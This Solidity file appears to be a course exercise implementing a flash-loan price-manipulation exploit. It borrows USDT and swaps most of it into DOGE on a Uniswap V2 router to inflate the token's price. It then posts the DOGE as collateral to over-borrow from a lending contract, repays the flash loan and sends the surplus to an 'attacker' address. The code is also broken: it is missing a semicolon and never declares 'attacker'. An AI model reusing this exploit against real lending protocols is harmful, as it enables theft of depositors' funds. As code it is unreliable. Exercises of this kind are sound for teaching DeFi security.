// SPDX-License-Identifier: UZH
pragma solidity ^0.8.0;

import "./IERC3156FlashLender.sol";
import "./IERC20.sol";
import '../uniswap-v2/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';
import '../collateral-loan/ICollateralLoan.sol';

//The borrower implementation
contract FlashBorrower is IERC3156FlashBorrower {
    enum Action {NORMAL, OTHER}
    IERC3156FlashLender lender;
    address ROUTER = 0x1ceae99b55aC4a79c0f74460E628067e30e38925;
    address COLLATERAL_LOAN = 0xBeB2c168eB45Cab948A5aBf0e3038e85973b35c6;
    uint public curBalanceDoge;
    uint public curBalanceUsdt;
    uint public newBalanceUsdt;
    uint public newBalanceDoge;
    uint public delta;
    
    constructor (IERC3156FlashLender lender_) {
        lender = lender_;
    }

    /// @dev ERC-3156 Flash loan callback
    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data) external override returns(bytes32) {
        require(msg.sender == address(lender), "FlashBorrower: Untrusted lender");
        require(initiator == address(this), "FlashBorrower: Untrusted loan initiator");
        (Action action) = abi.decode(data, (Action));
        
        address doge = 0x6fb00A57093bAA020e92043009239471fd596c89;
        address usdt = token;

        // 1. swap on uniswap
        uint amountToSwap = (amount / 100) * 90;
        address[] memory path = new address[](2);
        path[0] = usdt;
        path[1] = doge;
        
        IERC20(usdt).approve(ROUTER, amountToSwap);
        IUniswapV2Router02(ROUTER).swapExactTokensForTokens(
            amountToSwap,
            1000000000000000000,
            path,
            address(this),
            1639564244
        );
        
        curBalanceDoge = IERC20(doge).balanceOf(address(this));
        curBalanceUsdt = IERC20(usdt).balanceOf(address(this));
        
        // 2. loan (usdt) given collateral (doge)
        uint collateralAmount = IERC20(doge).balanceOf(address(this));
        IERC20(doge).approve(COLLATERAL_LOAN, collateralAmount);
        ICollateralLoan(COLLATERAL_LOAN).loan(usdt, doge, collateralAmount);
        
        newBalanceUsdt = IERC20(usdt).balanceOf(address(this));
        newBalanceDoge = IERC20(doge).balanceOf(address(this));
        
        // 3. approve amount (for repaying the flash loan)
        uint256 _allowance = IERC20(token).allowance(address(this), address(lender));
        uint256 _fee = lender.flashFee(token, amount);
        uint256 _repayment = amount + _fee;
        uint256 amountToRepay = _allowance + _repayment
        IERC20(token).approve(address(lender), amountToRepay);
        
        // 4. calculate positive delta and transfer to attacker
        IERC20(token).transfer(attacker, IERC20(usdt).balanceOf(address(this)) - amountToRepay);
        
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    /// @dev Initiate a flash loan
    function flashBorrow(address token, uint256 amount) public {
        bytes memory data = abi.encode(Action.NORMAL);
        lender.flashLoan(this, token, amount, data);
    }
}

